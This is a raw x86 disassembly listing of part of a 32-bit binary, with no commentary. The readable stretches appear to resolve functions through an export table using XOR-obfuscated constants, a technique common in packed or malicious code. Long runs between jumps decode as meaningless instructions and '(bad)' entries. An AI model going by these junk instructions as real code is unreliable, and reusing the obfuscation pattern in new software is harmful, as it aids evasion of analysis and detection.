  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	stos   BYTE PTR es:[edi],al
  40d5b8:	mov    esp,0x8f51ee1d
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d56b
  40d5c4:	sub    al,0x8a
  40d5c6:	xor    DWORD PTR [edx-0x3e],edx
  40d5c9:	pop    edi
  40d5ca:	fdiv   DWORD PTR [eax]
  40d5cc:	dec    ecx
  40d5cd:	loop   0x40d5a0
  40d5cf:	push   esp
  40d5d0:	xchg   edx,eax
  40d5d1:	enter  0x75ec,0x88
  40d5d5:	fs adc ecx,ebx
  40d5d8:	dec    ebx
  40d5d9:	sub    al,0xed
  40d5db:	iret   
  40d5dc:	dec    eax
  40d5dd:	jmp    FWORD PTR [eax]
  40d5df:	popa   
  40d5e0:	sub    al,0xd6
  40d5e2:	mov    BYTE PTR [esi],al
  40d5e4:	fld    st(0)
  40d5e6:	xor    eax,0xefa35880
  40d5eb:	jecxz  0x40d595
  40d5ed:	adc    DWORD PTR [esi+0x60],ebx
  40d5f0:	cs push ss
  40d5f2:	cs cld 
  40d5f4:	aaa    
  40d5f5:	push   ds
  40d5f6:	loopne 0x40d61d
  40d5f8:	ja     0x40d61f
  40d5fa:	jecxz  0x40d5e2
  40d5fc:	sub    eax,0x52957395
  40d601:	cmp    bh,0x59
  40d604:	ficomp DWORD PTR [edx]
  40d606:	mov    al,0xa1
  40d608:	outs   dx,BYTE PTR ds:[esi]
  40d609:	imul   DWORD PTR [edi+0x161046ac]
  40d60f:	scas   eax,DWORD PTR es:[edi]
  40d610:	add    eax,esp
  40d612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d613:	mov    dl,0x74
  40d615:	aaa    
  40d616:	daa    
  40d617:	xchg   ebp,eax
  40d618:	or     dl,BYTE PTR [eax+0x3914a8d7]
  40d61e:	mul    DWORD PTR [ebp-0x75]
  40d621:	aaa    
  40d622:	jmp    0x40d635
  40d624:	sbb    eax,ebx
  40d626:	jne    0x40d66b
  40d628:	xchg   DWORD PTR [ebx+0x246acf46],edx
  40d62e:	dec    edi
  40d62f:	push   0x3
  40d631:	dec    esp
  40d632:	sub    al,BYTE PTR [esi]
  40d634:	adc    bh,BYTE PTR [ebp-0x2e]
  40d637:	dec    edi
  40d638:	pop    ebx
  40d639:	push   ebp
  40d63a:	addr16 aad 0x78
  40d63d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d63e:	mov    dh,0xdb
  40d640:	test   DWORD PTR [edi+ebp*4],esp
  40d643:	push   0x3
  40d645:	nop
  40d646:	dec    esp
  40d647:	mov    esi,0x55185469
  40d64c:	test   ecx,esi
  40d64e:	fwait
  40d64f:	stos   BYTE PTR es:[edi],al
  40d650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d651:	cmp    DWORD PTR [ebp-0x339f309a],edi
  40d657:	ss hlt 
  40d659:	int3   
  40d65a:	aam    0x13
  40d65c:	pop    ds
  40d65d:	mov    edx,0x5ad95e9f
  40d662:	push   0xffffffa9
  40d664:	js     0x40d649
  40d666:	into   
  40d667:	les    ecx,FWORD PTR [ecx-0x49d4978b]
  40d66d:	inc    DWORD PTR gs:[ecx-0x3]
  40d671:	add    ch,BYTE PTR [ecx-0x62385aab]
  40d677:	pop    ebp
  40d678:	ret    0x2c63
  40d67b:	mov    ecx,0xed14c0e
  40d680:	mov    eax,ds:0xf03d2d1d
  40d685:	xchg   esp,eax
  40d686:	icebp  
  40d687:	inc    ecx
  40d688:	js     0x40d6d4
  40d68a:	mov    ch,0xa7
  40d68c:	pop    edi
  40d68d:	sbb    al,0x16
  40d68f:	sub    ebp,edi
  40d691:	mov    bl,0xf7
  40d693:	cs jge 0x40d6a5
  40d696:	jbe    0x40d654
  40d698:	fcom   QWORD PTR [ebp-0x7e]
  40d69b:	in     eax,dx
  40d69c:	or     DWORD PTR [edx],0xaff9ce52
  40d6a2:	and    dl,BYTE PTR [ebx]
  40d6a4:	push   0xb676bfd
  40d6a9:	stc    
  40d6aa:	lods   al,BYTE PTR ds:[esi]
  40d6ab:	in     al,0xef
  40d6ad:	xor    eax,0xcc49c14c
  40d6b2:	xor    eax,0xda6557e
  40d6b7:	in     al,dx
  40d6b8:	xor    DWORD PTR [ebx],esp
  40d6ba:	dec    esi
  40d6bb:	loop   0x40d71b
  40d6bd:	jno    0x40d6f1
  40d6bf:	pop    ss
  40d6c0:	icebp  
  40d6c1:	icebp  
  40d6c2:	mov    WORD PTR [ebx+0x1d4ee177],gs
  40d6c8:	xor    dh,BYTE PTR [edx-0x2e9107c7]
  40d6ce:	pop    ebp
  40d6cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6d0:	dec    DWORD PTR [ebp-0x37]
  40d6d3:	jg     0x40d6ba
  40d6d5:	adc    al,0xa9
  40d6d7:	int    0x0
  40d6d9:	xor    ah,0x33
  40d6dc:	xlat   BYTE PTR ds:[ebx]
  40d6dd:	call   0x6e59bf35
  40d6e2:	aad    0x1e
  40d6e4:	cmp    DWORD PTR [ecx+0x5f],esp
  40d6e7:	sub    eax,0x1aef0206
  40d6ec:	sub    ecx,DWORD PTR [edi-0x3ba7472]
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [edx-0x30],es
  40d728:	jp     0x40d7a5
  40d72a:	add    eax,0x227e7e8d
  40d72f:	jg     0x40d7af
  40d731:	jle    0x40d6ec
  40d733:	cdq    
  40d734:	mov    fs,WORD PTR [eax+0x21]
  40d737:	mov    esi,0x223a167b
  40d73c:	cmp    al,0x75
  40d73e:	xchg   esp,eax
  40d73f:	mov    edx,0x92ef3e2f
  40d744:	in     eax,0x2e
  40d746:	outs   dx,BYTE PTR ds:[esi]
  40d747:	mov    ds:0xe58cca83,eax
  40d74c:	pop    ecx
  40d74d:	dec    ebx
  40d74e:	mov    esp,0xe9690a43
  40d753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d754:	cmp    ebp,edx
  40d756:	clc    
  40d757:	mov    ah,0xd2
  40d759:	bound  ebp,QWORD PTR [ecx]
  40d75b:	in     al,dx
  40d75c:	lahf   
  40d75d:	jb     0x40d769
  40d75f:	pop    eax
  40d760:	inc    eax
  40d761:	pushf  
  40d762:	cli    
  40d763:	fild   WORD PTR [esi-0x60]
  40d766:	dec    ebx
  40d767:	mov    ebp,0xdbaa65dc
  40d76c:	jge    0x40d6f1
  40d76e:	iret   
  40d76f:	jl     0x40d7b5
  40d771:	cld    
  40d772:	imul   BYTE PTR [edx]
  40d774:	stos   DWORD PTR es:[edi],eax
  40d775:	outs   dx,DWORD PTR ds:[esi]
  40d776:	inc    esi
  40d777:	leave  
  40d778:	lods   al,BYTE PTR ds:[esi]
  40d779:	mov    WORD PTR [ecx+0x5612db95],?
  40d77f:	in     al,0x42
  40d781:	xchg   esi,eax
  40d782:	in     al,0x19
  40d784:	and    eax,DWORD PTR [esi+0xef49ee4]
  40d78a:	mov    ds:0x60d6cc9e,al
  40d78f:	mov    edi,0xfd422605
  40d794:	or     al,0x83
  40d796:	les    ebp,FWORD PTR [esi+0x353b6f91]
  40d79c:	adc    ecx,edx
  40d79e:	cmp    BYTE PTR gs:[ebp+eax*4+0x52],cl
  40d7a3:	ret    
  40d7a4:	mov    ch,0x61
  40d7a6:	out    dx,al
  40d7a7:	add    esi,0xb36b8c79
  40d7ad:	add    DWORD PTR [edx-0x1c],0xffffff93
  40d7b1:	mov    ds:0x44f457e0,al
  40d7b6:	call   0x89f1:0x91a3829a
  40d7bd:	retf   
  40d7be:	pop    esi
  40d7bf:	jne    0x40d791
  40d7c1:	xor    DWORD PTR [edi-0x68c17703],ecx
  40d7c7:	loope  0x40d776
  40d7c9:	sbb    ecx,DWORD PTR [edi+eax*8+0x1d2e759b]
  40d7d0:	(bad)  
  40d7d1:	pop    ebp
  40d7d2:	push   edx
  40d7d3:	add    DWORD PTR [ebx-0xe],eax
  40d7d6:	dec    edx
  40d7d7:	data16 jae 0x40d82b
  40d7da:	mov    edi,0x9396941
  40d7df:	cld    
  40d7e0:	popa   
  40d7e1:	xchg   BYTE PTR [ebp+0x3f],ch
  40d7e4:	cmc    
  40d7e5:	and    DWORD PTR [edx-0x7d21e16f],ebx
  40d7eb:	cld    
  40d7ec:	std    
  40d7ed:	int3   
  40d7ee:	sub    eax,0xb6e5552e
  40d7f3:	mov    edx,0x2c1539fb
  40d7f8:	lahf   
  40d7f9:	xor    al,cl
  40d7fb:	mov    edi,DWORD PTR [ebp+edx*2-0x7e]
  40d7ff:	pop    ds
  40d800:	xchg   esp,eax
  40d801:	icebp  
  40d802:	fsubr  QWORD PTR [edi+eax*1]
  40d805:	ror    BYTE PTR [esi],cl
  40d807:	and    eax,edx
  40d809:	cmp    eax,0xd6eed4bd
  40d80e:	push   cs
  40d80f:	mov    dl,0xc8
  40d811:	arpl   cx,di
  40d813:	leave  
  40d814:	add    BYTE PTR [ecx],0xf0
  40d817:	xchg   esi,eax
  40d818:	pop    esi
  40d819:	sahf   
  40d81a:	stos   DWORD PTR es:[edi],eax
  40d81b:	cmp    BYTE PTR [edx-0x34f27d17],bl
  40d821:	pop    esp
  40d822:	or     BYTE PTR [edx-0x16a3f27e],al
  40d828:	mov    edx,0x5685fcf8
  40d82d:	jp     0x40d7c6
  40d82f:	fisub  WORD PTR [edx-0x63]
  40d832:	jns    0x40d823
  40d834:	jp     0x40d814
  40d836:	icebp  
  40d837:	pop    ebp
  40d838:	mov    eax,?
  40d83a:	loop   0x40d875
  40d83c:	mov    ds,esp
  40d83e:	cmp    eax,edi
  40d840:	inc    eax
  40d841:	std    
  40d842:	sbb    eax,DWORD PTR [ebx]
  40d844:	lds    ebx,FWORD PTR [ebx-0x80]
  40d847:	xchg   ebp,eax
  40d848:	iret   
  40d849:	adc    BYTE PTR [ebp+0x1b],0x6a
  40d84d:	jp     0x40d7ef
  40d84f:	lahf   
  40d850:	push   0x6e
  40d852:	call   0xcb805012
  40d857:	mov    edx,0x48a9461f
  40d85c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d85d:	adc    ebx,DWORD PTR [ecx+0x6a]
  40d860:	add    eax,0xcb875b49
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	or     al,0x16
  40d87a:	add    al,0x52
  40d87c:	sub    DWORD PTR [edx+0x7f227e7e],ecx
  40d882:	jle    0x40d902
  40d884:	int    0x72
  40d886:	jbe    0x40d81e
  40d888:	les    esi,FWORD PTR [edi+0x34439eb2]
  40d88e:	xchg   ebp,eax
  40d88f:	sahf   
  40d890:	in     al,dx
  40d891:	pop    ecx
  40d892:	fisttp WORD PTR [edx+eax*1]
  40d895:	call   0x27a66393
  40d89a:	mov    eax,ecx
  40d89c:	add    dl,bl
  40d89e:	dec    DWORD PTR [esi+0x582f0862]
  40d8a4:	jno    0x40d914
  40d8a6:	fidivr WORD PTR [ebx+0x4b]
  40d8a9:	mov    DWORD PTR [eax],eax
  40d8ab:	lock outs dx,BYTE PTR es:[esi]
  40d8ae:	aam    0x2c
  40d8b0:	pop    edi
  40d8b1:	shr    DWORD PTR [esi+0xa],cl
  40d8b4:	xchg   ebx,eax
  40d8b5:	mov    DWORD PTR [ecx-0x41],esp
  40d8b8:	icebp  
  40d8b9:	fidivr DWORD PTR [eax+ebp*8+0x71]
  40d8bd:	and    DWORD PTR ds:0xd464b33f,ebp
  40d8c3:	jae    0x40d8a3
  40d8c5:	rcl    edi,0x4f
  40d8c8:	les    ebp,FWORD PTR [edi]
  40d8ca:	or     eax,0xf127c4e3
  40d8cf:	jb     0x40d8c4
  40d8d1:	jno    0x40d876
  40d8d3:	mov    dl,0xa5
  40d8d5:	sbb    eax,0x99f56600
  40d8da:	xchg   eax,ebp
  40d8dc:	cmp    ebx,eax
  40d8de:	hlt    
  40d8df:	add    dh,BYTE PTR [ebx]
  40d8e1:	mov    esi,0xe04bd030
  40d8e6:	nop
  40d8e7:	retf   0x1b83
  40d8ea:	inc    esp
  40d8eb:	pop    es
  40d8ec:	inc    edi
  40d8ed:	or     eax,0x62ec2dfb
  40d8f2:	shl    BYTE PTR [esi],0xe0
  40d8f5:	sub    eax,DWORD PTR [edx-0xe41eb17]
  40d8fb:	sbb    DWORD PTR [ebx+0x5e],ecx
  40d8fe:	fdiv   st(5),st
  40d900:	xchg   DWORD PTR [esp+ebx*1],ecx
  40d903:	sub    al,0xa0
  40d905:	aas    
  40d906:	repnz xor DWORD PTR [edx-0x1e],esp
  40d90a:	and    BYTE PTR [ecx+eiz*2+0x4f],0xe6
  40d90f:	jne    0x40d8ba
  40d911:	and    DWORD PTR [ebx],ecx
  40d913:	mov    eax,0xb27ef7e4
  40d918:	and    ah,BYTE PTR [ecx]
  40d91a:	mov    dl,BYTE PTR [eax+0x4b]
  40d91d:	mov    bl,0x46
  40d91f:	shl    BYTE PTR [ecx+0x79],0xac
  40d923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d924:	adc    al,0x90
  40d926:	cmp    eax,0xd39c24df
  40d92b:	xor    esp,ecx
  40d92d:	dec    ecx
  40d92e:	leave  
  40d92f:	and    BYTE PTR [eax-0x12],ah
  40d932:	push   eax
  40d933:	inc    edi
  40d934:	aas    
  40d935:	out    dx,eax
  40d936:	repz and dl,BYTE PTR [eax+0x2a]
  40d93a:	mov    esi,0x78da54ed
  40d93f:	stos   BYTE PTR es:[edi],al
  40d940:	xchg   BYTE PTR [ebx],dh
  40d942:	fcom   QWORD PTR [edx-0x26]
  40d945:	jp     0x40d944
  40d947:	mov    ds:0x2cbc3d26,al
  40d94c:	and    al,0x4
  40d94e:	xor    BYTE PTR [esi+0x7e],al
  40d951:	fsubr  DWORD PTR [ecx+0x3926bd9c]
  40d957:	sbb    bh,BYTE PTR [esi-0x76f021d9]
  40d95d:	xchg   DWORD PTR [edi+0x54],esp
  40d960:	daa    
  40d961:	sub    cl,BYTE PTR [esi-0x6181e71f]
  40d967:	nop
  40d968:	xor    BYTE PTR [ecx+0x4e],ch
  40d96b:	stc    
  40d96c:	or     edi,DWORD PTR [ebx]
  40d96e:	call   0xa7ae4903
  40d973:	in     al,0xab
  40d975:	ins    DWORD PTR es:[edi],dx
  40d976:	out    0xa3,al
  40d978:	add    al,0x35
  40d97a:	or     DWORD PTR [esi-0x3cd69036],ebp
  40d980:	xchg   edi,eax
  40d981:	bound  ecx,QWORD PTR [ecx+0x7c]
  40d984:	pop    ebp
  40d985:	pop    ss
  40d986:	and    edi,DWORD PTR [eax-0x5d]
  40d989:	mov    cl,0x70
  40d98b:	jbe    0x40d9f4
  40d98d:	addr16 in al,0x73
  40d990:	cli    
  40d991:	push   0xffffffb4
  40d993:	mov    DWORD PTR [edi],esp
  40d995:	dec    esi
  40d996:	repz ficomp WORD PTR [ebx+ecx*1+0x2b]
  40d99b:	and    eax,0x289aa6b2
  40d9a0:	and    esp,ebx
  40d9a2:	ds mov bh,0x45
  40d9a5:	fiadd  WORD PTR [edx+esi*1+0x68d32b2a]
  40d9ac:	push   es
  40d9ad:	lds    edx,FWORD PTR [ecx*2+0x44e9cb87]
  40d9b4:	add    DWORD PTR [eax],eax
  40d9b6:	add    BYTE PTR [ebx-0xeb9345b],bh
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	aam    0x7b
  40d9c5:	das    
  40d9c6:	and    bl,ch
  40d9c8:	mov    edi,DWORD PTR [esi+0x7e]
  40d9cb:	and    bh,BYTE PTR [edi+0x7e]
  40d9ce:	jle    0x40d99d
  40d9d0:	cmp    dl,BYTE PTR [ebx+0xb]
  40d9d3:	sar    DWORD PTR [ebp-0x57e14d5d],0xb5
  40d9da:	xchg   esi,eax
  40d9db:	test   DWORD PTR [edi-0x67],esp
  40d9de:	pop    edi
  40d9df:	or     al,0x71
  40d9e1:	aaa    
  40d9e2:	popa   
  40d9e3:	ja     0x40d970
  40d9e5:	ret    
  40d9e6:	mov    cl,0x51
  40d9e8:	push   eax
  40d9e9:	xchg   edi,eax
  40d9ea:	bound  eax,QWORD PTR [ebx+0x27225e60]
  40d9f0:	jle    0x40d9c7
  40d9f2:	jecxz  0x40d9f9
  40d9f4:	pop    ds
  40d9f5:	fdivr  st,st(0)
  40d9f7:	jb     0x40da52
  40d9f9:	std    
  40d9fa:	daa    
  40d9fb:	xchg   DWORD PTR [ebx+0x39],edx
  40d9fe:	jg     0x40da44
  40da00:	fwait
  40da01:	mov    al,ds:0xe7386ed7
  40da06:	jo     0x40da30
  40da08:	mov    al,0x64
  40da0a:	adc    al,BYTE PTR [eax-0x33c7f1a6]
  40da10:	sub    eax,0x5f5c7765
  40da15:	les    esi,FWORD PTR [esi]
  40da17:	fsubr  QWORD PTR [ebx-0x723b1d44]
  40da1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da1e:	(bad)  
  40da1f:	mov    DWORD PTR [eax],0x3c877da8
  40da25:	add    al,0x49
  40da27:	push   eax
  40da28:	pop    bx
  40da2a:	push   ds
  40da2b:	fldenv [ecx+0x12051d56]
  40da31:	fild   WORD PTR [edi]
  40da33:	push   ebp
  40da34:	es cmp al,0xe1
  40da37:	add    eax,0x693cd06e
  40da3c:	mov    ch,0xec
  40da3e:	jl     0x40da49
  40da40:	fldenv [ecx+0xf]
  40da43:	cdq    
  40da44:	mov    bl,0xef
  40da46:	pop    ebx
  40da47:	inc    ebp
  40da48:	sbb    bh,bh
  40da4a:	out    dx,eax
  40da4b:	retf   0x46d4
  40da4e:	shl    bl,cl
  40da50:	dec    edx
  40da51:	hlt    
  40da52:	sub    al,0xe7
  40da54:	mov    BYTE PTR [ecx-0x64eddc13],ah
  40da5a:	jp     0x40da0f
  40da5c:	jmp    0x53db:0x77874a91
  40da63:	cmp    edx,edi
  40da65:	(bad)  
  40da66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da67:	xor    dh,ah
  40da69:	je     0x40dab2
  40da6b:	es dec esi
  40da6d:	scas   al,BYTE PTR es:[edi]
  40da6e:	mov    ds:0xc6969174,eax
  40da73:	push   ecx
  40da74:	mov    ds:0x74452020,eax
  40da79:	sub    DWORD PTR [edi+0x30c9ea8f],esp
  40da7f:	das    
  40da80:	mov    edx,0x3f5c9e32
  40da85:	push   esp
  40da86:	ret    
  40da87:	adc    ecx,edx
  40da89:	pop    ss
  40da8a:	aad    0x2c
  40da8c:	iret   
  40da8d:	int3   
  40da8e:	adc    eax,0x3bac32fe
  40da93:	arpl   WORD PTR [esi+0x18b6da94],bx
  40da99:	mov    bh,0x95
  40da9b:	aad    0x39
  40da9d:	sub    eax,0xfe8306d3
  40daa2:	mov    DWORD PTR [edx+0x6e],edi
  40daa5:	inc    esp
  40daa6:	cmp    al,0x2c
  40daa8:	inc    esi
  40daa9:	push   ebp
  40daaa:	jecxz  0x40da40
  40daac:	sti    
  40daad:	les    edi,FWORD PTR [esi-0x37]
  40dab0:	jge    0x40da95
  40dab2:	(bad)  
  40dab3:	adc    DWORD PTR [ecx+0x7057803f],ecx
  40dab9:	xor    DWORD PTR [edi+eax*8+0x6a],ebp
  40dabd:	fldl2t 
  40dabf:	aaa    
  40dac0:	mov    ds:0x76c9d702,al
  40dac5:	adc    eax,0x2f770d65
  40daca:	ret    0xfe83
  40dacd:	out    0xb5,al
  40dacf:	sbb    DWORD PTR es:[ebp-0x4a],edi
  40dad3:	add    edi,edi
  40dad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dad6:	ss test al,0x85
  40dad9:	(bad)  
  40dada:	pop    ds
  40dadb:	jno    0x40dab1
  40dadd:	adc    DWORD PTR [edx-0x41],0x2bef245a
  40dae4:	dec    eax
  40dae5:	rcr    DWORD PTR [ecx-0x7d],cl
  40dae8:	ins    BYTE PTR es:[edi],dx
  40dae9:	xor    DWORD PTR [eax+eax*4+0x2d],esp
  40daed:	mov    WORD PTR [ebx],gs
  40daef:	pop    ecx
  40daf0:	dec    ecx
  40daf1:	stos   BYTE PTR es:[edi],al
  40daf2:	lahf   
  40daf3:	xchg   BYTE PTR [ebp+0x5f],bl
  40daf6:	cmp    ebx,DWORD PTR [ecx+0x494248a3]
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0xc4b6fdf0
  40db32:	cmp    eax,ecx
  40db34:	push   0xffffff81
  40db36:	mov    BYTE PTR [esi+0x7e],bh
  40db39:	and    bh,BYTE PTR [edi+0x7e]
  40db3c:	jle    0x40dba4
  40db3e:	xlat   BYTE PTR ds:[ebx]
  40db3f:	cmp    cl,BYTE PTR [ebx]
  40db41:	shl    DWORD PTR [eax+ecx*8-0x5e3792cd],1
  40db48:	(bad)  
  40db49:	test   ebp,0xbf111803
  40db4f:	mov    eax,ds:0xa761c203
  40db54:	xor    DWORD PTR [edx],edx
  40db56:	in     eax,0x76
  40db58:	outs   dx,BYTE PTR ds:[esi]
  40db59:	jmp    0x5f28e5bb
  40db5e:	sbb    BYTE PTR [esi-0x54e79562],bl
  40db64:	imul   edx,DWORD PTR [ecx+ebx*4+0x10f6f04c],0xdbcdc4
  40db6f:	add    BYTE PTR [ebx],0xe1
  40db72:	and    esi,esp
  40db74:	xchg   ebp,eax
  40db75:	push   esi
  40db76:	out    dx,eax
  40db77:	repnz out 0x5f,al
  40db7a:	jmp    0xae82:0x614b3173
  40db81:	sbb    BYTE PTR [ecx],0xc6
  40db84:	sbb    eax,0xb99fb94
  40db89:	mov    ebx,0x62a162b8
  40db8e:	fwait
  40db8f:	jb     0x40db83
  40db91:	fwait
  40db92:	mov    dh,0xb8
  40db94:	pop    eax
  40db95:	hlt    
  40db96:	dec    eax
  40db97:	neg    BYTE PTR [edx-0x2e]
  40db9a:	lock inc ebp
  40db9c:	push   ebp
  40db9d:	mov    bl,0x1
  40db9f:	cli    
  40dba0:	nop
  40dba1:	out    dx,eax
  40dba2:	and    ch,BYTE PTR [ebx]
  40dba4:	pop    ebp
  40dba5:	adc    eax,0xd206c138
  40dbaa:	pop    es
  40dbab:	jg     0x40dbab
  40dbad:	jmp    0x2313bc4d
  40dbb2:	pop    es
  40dbb3:	std    
  40dbb4:	push   ss
  40dbb5:	jecxz  0x40dbfb
  40dbb7:	jge    0x40db96
  40dbb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbba:	jg     0x40db84
  40dbbc:	in     al,dx
  40dbbd:	dec    edi
  40dbbe:	cs inc ebp
  40dbc0:	jg     0x40dbf8
  40dbc2:	xor    dl,0x73
  40dbc5:	mov    ds:0x45e1e1fa,al
  40dbca:	leave  
  40dbcb:	mov    dl,BYTE PTR [edx]
  40dbcd:	fild   DWORD PTR [ebx+0x50]
  40dbd0:	stos   DWORD PTR es:[edi],eax
  40dbd1:	inc    esp
  40dbd2:	adc    DWORD PTR [eax+0x672d41d7],ebx
  40dbd8:	push   ds
  40dbd9:	inc    edi
  40dbda:	dec    ebx
  40dbdb:	cmp    eax,0xecfcca9c
  40dbe0:	outs   dx,BYTE PTR ds:[esi]
  40dbe1:	jo     0x40db9c
  40dbe3:	dec    esi
  40dbe4:	shl    DWORD PTR [edi-0x51a1b184],1
  40dbea:	inc    eax
  40dbeb:	adc    edi,DWORD PTR [ecx]
  40dbed:	stc    
  40dbee:	xchg   DWORD PTR [ebp+0x52503a4d],edx
  40dbf4:	add    DWORD PTR [edx-0x7ac35918],0x5c
  40dbfb:	pop    ebp
  40dbfc:	mov    WORD PTR [eax+ebp*8],ds
  40dbff:	scas   eax,DWORD PTR es:[edi]
  40dc00:	push   ebp
  40dc01:	cmp    BYTE PTR [edi+0x32],bl
  40dc04:	cmc    
  40dc05:	mov    ch,0x49
  40dc07:	loop   0x40dba2
  40dc09:	lock fwait
  40dc0b:	leave  
  40dc0c:	push   ecx
  40dc0d:	imul   edx,DWORD PTR [edi-0x71],0xdd38ca09
  40dc14:	les    ebx,FWORD PTR [esi]
  40dc16:	(bad)  
  40dc18:	aad    0xec
  40dc1a:	int    0xcb
  40dc1c:	cmp    BYTE PTR [ebp-0x3a],cl
  40dc1f:	fwait
  40dc20:	mov    al,0xb8
  40dc22:	hlt    
  40dc23:	adc    ebp,ebx
  40dc25:	scas   eax,DWORD PTR es:[edi]
  40dc26:	add    dh,dl
  40dc28:	mov    WORD PTR [eax-0x41],cs
  40dc2b:	sub    ah,cl
  40dc2d:	jmp    0x40dc9f
  40dc2f:	xchg   esi,eax
  40dc30:	sub    al,0x4a
  40dc32:	mov    al,ds:0x79767284
  40dc37:	icebp  
  40dc38:	xchg   ebx,eax
  40dc39:	mov    ebx,ds
  40dc3b:	push   esp
  40dc3c:	mov    bh,0xb
  40dc3e:	cmc    
  40dc3f:	lds    edi,FWORD PTR [ebp+0x55]
  40dc42:	pop    ebx
  40dc43:	inc    esi
  40dc44:	jo     0x40dcae
  40dc46:	xor    ch,0xee
  40dc49:	ret    
  40dc4a:	ret    
  40dc4b:	test   DWORD PTR [edx-0x61b68bec],ecx
  40dc51:	(bad)  
  40dc52:	loope  0x40dcc5
  40dc54:	fdivrp st(6),st
  40dc56:	pop    ecx
  40dc57:	hlt    
  40dc58:	sbb    eax,0xe942f110
  40dc5d:	mov    eax,DWORD PTR [eax-0x64]
  40dc60:	mov    al,0xb3
  40dc62:	pop    edx
  40dc63:	jl     0x40dbfc
  40dc65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc66:	and    ecx,ebp
  40dc68:	or     eax,DWORD PTR [ebx]
  40dc6a:	ret    0x558b
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
